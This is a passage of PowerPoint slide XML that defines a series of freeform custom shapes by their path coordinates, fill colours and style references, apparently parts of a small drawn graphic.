                <a:lnTo>
                  <a:pt x="78" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="67"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="402" name="CustomShape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689200" y="4503600"/>
            <a:ext cx="151560" cy="50040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="96" h="32">
                <a:moveTo>
                  <a:pt x="96" y="12"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="93" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="12"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="403" name="CustomShape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2763720" y="4521240"/>
            <a:ext cx="65880" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="42" h="14">
                <a:moveTo>
                  <a:pt x="42" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="404" name="CustomShape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697120" y="4510080"/>
            <a:ext cx="43560" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="28" h="10">
                <a:moveTo>
                  <a:pt x="28" y="5"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="5"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="CustomShape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589120" y="4524480"/>
            <a:ext cx="256320" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="162" h="55">
                <a:moveTo>
                  <a:pt x="0" y="17"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="158" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="155" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="406" name="CustomShape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2846520" y="4514760"/>
            <a:ext cx="89640" cy="40680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="57" h="26">
                <a:moveTo>
                  <a:pt x="6" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="57" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="407" name="CustomShape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606760" y="4341960"/>
            <a:ext cx="50040" cy="192960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="122">
                <a:moveTo>
                  <a:pt x="32" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="115"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="114"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="111"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="7fbfbf"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408" name="CustomShape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2608200" y="4343400"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="97"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="94"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="93cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="409" name="CustomShape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2611440" y="4344840"/>
            <a:ext cx="34200" cy="132480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="22" h="84">
                <a:moveTo>
                  <a:pt x="22" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a8d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="410" name="CustomShape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="4344840"/>
            <a:ext cx="26280" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="65">
                <a:moveTo>
                  <a:pt x="17" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bce5e5"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="411" name="CustomShape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="4346640"/>
            <a:ext cx="21600" cy="73800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="47">
                <a:moveTo>
                  <a:pt x="14" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="d1f2f2"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="CustomShape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2614680" y="4348080"/>
            <a:ext cx="13680" cy="42120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="27">
                <a:moveTo>
                  <a:pt x="9" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="e5ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="413" name="CustomShape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2790720" y="4470480"/>
            <a:ext cx="21600" cy="19800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="13">
                <a:moveTo>
                  <a:pt x="7" y="13"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="8" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="13"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
